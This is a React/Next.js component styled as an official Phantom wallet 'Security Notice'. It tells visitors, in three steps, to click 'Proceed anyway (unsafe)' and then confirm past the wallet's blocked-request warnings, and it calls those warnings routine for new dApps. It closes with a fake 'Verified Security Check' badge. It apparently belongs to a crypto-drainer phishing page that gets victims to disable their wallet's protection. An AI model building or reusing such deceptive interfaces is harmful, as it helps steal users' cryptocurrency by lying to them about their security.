'use client';

import React from 'react';
import Image from 'next/image';

const PhantomWarning: React.FC = () => {
  return (
    <div className="max-w-2xl mx-auto p-3">
      <div className="bg-[#1B1B1B] rounded-xl p-4 border border-[#2A2A2A]">
        {/* Header */}
        <div className="mb-4">
          <span className="text-white/90 px-3 py-1.5 rounded-md inline-flex items-center gap-2 border border-[#ff6b6b]/30 bg-[#2A2A2A]">
            <Image 
              src="/phantom-icon.png"
              alt="Phantom"
              width={50}  // Made larger
              height={50}
              className="opacity-100" // Increased opacity
            />
            <span className="font-medium">Important Phantom Security Notice</span>
          </span>
        </div>
        
        <div className="space-y-6">
          {/* Step 1 */}
          <div className="bg-[#2A2A2A] rounded-lg p-4 border border-[#3A3A3A]">
            <span className="text-[#ff6b6b] font-medium block mb-2">
              Step 1: Request Blocked
            </span>
            <span className="text-white/90 block mb-1">
              Click &quot;Proceed anyway (unsafe)&quot;
            </span>
            <span className="text-white/60 block italic text-sm">
              Standard warning for new dApps
            </span>
          </div>

          {/* Step 2 */}
          <div className="bg-[#2A2A2A] rounded-lg p-4 border border-[#3A3A3A]">
            <span className="text-[#ff6b6b] font-medium block mb-2">
              Step 2: Confirmation
            </span>
            <span className="text-white/90 block mb-1">
              Click &quot;Confirm (unsafe)&quot;
            </span>
            <span className="text-white/60 block italic text-sm">
              Security verification step
            </span>
          </div>

          {/* Step 3 */}
          <div className="bg-[#2A2A2A] rounded-lg p-4 border border-[#3A3A3A]">
            <span className="text-[#ff6b6b] font-medium block mb-2">
              Step 3: Final Step
            </span>
            <span className="text-white/90 block mb-1">
              Check &quot;I understand&quot;
            </span>
            <span className="text-white/90 block">
              Click &quot;Yes, confirm (unsafe)&quot;
            </span>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-6 flex justify-center">
          <div className="flex items-center gap-2 bg-[#2A2A2A] px-3 py-1.5 rounded-lg border border-[#3A3A3A]">
            <span className="text-[#14F195] inline-flex items-center gap-1">
              ✓ Verified Security Check
            </span>
            <span className="text-white/50 text-sm">
              Standard checks for new dApps
            </span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PhantomWarning;